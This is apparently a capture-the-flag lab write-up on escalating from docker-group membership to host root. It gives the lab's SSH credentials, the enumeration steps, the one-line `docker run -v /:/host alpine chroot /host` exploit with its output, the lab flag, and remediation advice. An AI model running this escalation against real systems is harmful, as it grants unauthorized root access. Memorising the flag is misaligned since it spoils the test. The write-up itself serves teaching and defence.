# Docker Privilege Escalation — Lab Writeup

> **Category:** Docker Security  
> **Difficulty:** Medium  
> **Points:** 200  
> **Flag:** `ctf{coo1eimal5looYiu3janohf7quuhai3i}`

---

## Overview

This lab demonstrates a classic Docker privilege escalation technique where a non-root user with membership in the `docker` group can gain full root access to the host system. Despite having no `sudo` privileges, the misconfigured group membership provides an equivalent level of access.

---

## Enumeration

### 1. SSH into the Target

```bash
ssh user@172.31.11.119
# Password: user
```

### 2. Check Current User Privileges

```bash
user@ip-172-31-11-119:~$ id
uid=1004(user) gid=1005(user) groups=1005(user),997(docker)

user@ip-172-31-11-119:~$ sudo -l
Sorry, user user may not run sudo on ip-172-31-11-119.
```

**Key Finding:** The user has no `sudo` rights but is a member of the `docker` group (`997(docker)`).

### 3. Confirm Not Inside a Container

```bash
ls -la /.dockerenv        # No such file — we are on the HOST
cat /proc/1/cgroup        # No docker references
```

### 4. Verify Docker Access

```bash
docker ps
# Returns empty list — confirms docker daemon is accessible
```

---

## Exploitation

### The Docker Group Misconfiguration

The `docker` group allows users to interact with the Docker daemon, which runs as **root**. This means any user in the `docker` group can:

- Spin up containers with arbitrary configurations
- Mount the host filesystem into a container
- Effectively gain root access to the host

### Exploit Command

```bash
docker run -it --rm -v /:/host alpine chroot /host
```

**Breaking it down:**

| Flag/Argument | Purpose |
|---------------|---------|
| `docker run -it` | Start an interactive container |
| `--rm` | Remove container after exit |
| `-v /:/host` | Mount the entire host filesystem (`/`) to `/host` inside the container |
| `alpine` | Lightweight Linux image |
| `chroot /host` | Change root to the mounted host filesystem |

### Result

```bash
root@e1d66acdd2dd:/# whoami
root

root@e1d66acdd2dd:~# cat /root/flag.txt
ctf{coo1eimal5looYiu3janohf7quuhai3i}
```

Instant root shell on the host! 🎉

---

## Attack Flow

```
[user] — member of docker group
         │
         ▼
docker run -v /:/host alpine chroot /host
         │
         ├─ Docker daemon (running as root) accepts the command
         ├─ Mounts entire host filesystem into container at /host
         └─ chroot makes /host the new root
         │
         ▼
[root shell on HOST]
         │
         ▼
cat /root/flag.txt → FLAG ✅
```

---

## Why This Works

The Docker daemon (`dockerd`) runs as **root** on the host. Any user in the `docker` group can send commands to this daemon — including commands to:

1. Create containers with **host filesystem mounts**
2. Run containers as **root** (default)
3. Use `chroot` to treat the host filesystem as the container's root

This effectively bypasses all user-level restrictions. Being in the `docker` group is considered **equivalent to passwordless sudo**.

---

## Remediation

| Issue | Fix |
|-------|-----|
| User added to `docker` group | Remove with: `gpasswd -d user docker` |
| Unrestricted Docker daemon access | Use **rootless Docker** (`dockerd-rootless`) |
| No authorization controls | Enable Docker's **authorization plugins** |
| Privileged containers allowed | Enforce policies with **AppArmor / Seccomp** profiles |
| No container runtime security | Use **gVisor** or **Kata Containers** for stronger isolation |

### Safer Alternative: Rootless Docker

```bash
# Install and run Docker in rootless mode
dockerd-rootless-setuptool.sh install
export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock
```

---

## Key Takeaways

- ⚠️ **Never add untrusted users to the `docker` group** — it is equivalent to giving them root.
- 🔍 **Always check group memberships** during privilege escalation enumeration.
- 🐳 **The Docker socket** (`/var/run/docker.sock`) and **docker group** are both high-value targets.
- 🛡️ Use **rootless Docker**, **Podman**, or proper **RBAC policies** to mitigate this risk.

---

## Tools Used

- `ssh` — Remote access
- `id` — User/group enumeration
- `docker` — Container runtime (the attack vector itself)
- `alpine` — Minimal container image used for the escape
- `chroot` — Filesystem root pivoting

---

*Writeup by: akshay | Lab: PentestGarage — Docker Security*
